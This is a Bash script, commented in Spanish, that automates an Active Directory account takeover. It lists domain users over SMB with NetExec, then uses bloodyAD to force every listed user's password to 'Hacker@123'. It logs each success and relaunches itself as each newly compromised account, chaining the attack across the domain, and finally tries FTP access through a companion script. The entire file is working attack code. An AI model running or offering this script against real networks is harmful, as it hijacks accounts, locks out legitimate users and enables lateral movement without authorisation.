#!/bin/bash

# Validar que se ingresen los tres argumentos
if [ $# -lt 4 ]; then
  echo "Faltan $(expr 4 - $#) argumentos"
  echo "Uso: $0 <IP> <DOMINIO> <usuario> <contraseña>"
  exit 1
fi

echo -e "\e[35mIntentando entrar con usuario: \e[36m$3 \e[0m: \e[36m$4\e[0m"
# Asignar argumentos a variables
IP="$1"
DOMINIO="$2"
USUARIO="$3"
CONTRASENA="$4"

# Inicializar variable de resultado
RESULTADO="OK"
salida1=""
# Ejecutar el comando smb y mostrar la salida en tiempo real
nxc smb "$DOMINIO" -u "$USUARIO" -p "$CONTRASENA" --users 2>&1 | while IFS= read -r line; do
  echo "$line"  # Mostrar cada línea en tiempo real
  if echo "$line" | grep -q "STATUS_LOGON_FAILURE"; then
    RESULTADO="KO"
    break  # Salir del bucle si se detecta el error
  fi

  # Extraer los nombres (asumiendo que están en la posición 4 de cada línea)
  # El nombre está después del tercer espacio, por lo que lo extraemos con awk
  NOMBRE=$(echo "$line" | awk '{print $5}')

  # Verificar que se extrajo un nombre
  if [ -n "$NOMBRE" ]; then
    # Almacenar los nombres en la variable salida1
    salida1+="$NOMBRE "
    echo -e "\e[7m| Usuarios: \e[3m$salida1 \e[7m|\e[0m"
    echo "Intentando cambiar contraseña a: '$NOMBRE' con contraseña 'Hacker@123'"
    bloodyAD --host $IP -d "$DOMINIO" -u "$USUARIO" -p "$CONTRASENA" set password "$NOMBRE" "Hacker@123" 2> /dev/null && echo -e "\e[32m\e[5m¡[+] $NOMBRE PWN!\e[0m" && echo "LA CONTRASEÑA DEL USUARIO $NOMBRE SE HA LOGRADO CAMBIAR A 'Hacker@123'" >> out.log && gnome-terminal -- zsh -c "$0 $1 $2 $NOMBRE Hacker@123 ;exec zsh"
#    fi
  fi
done

# Iterar y mostrar los nombres individualmente
for nombre in $salida1; do
  echo "$nombre"
done

# Imprimir el resultado final
echo "Intentando conectar al FTP..."
./ftp.sh $IP $USUARIO $CONTRASENA
if [ "$RESULTADO" == "KO" ]; then
  exit 1
else
  exit 0
fi

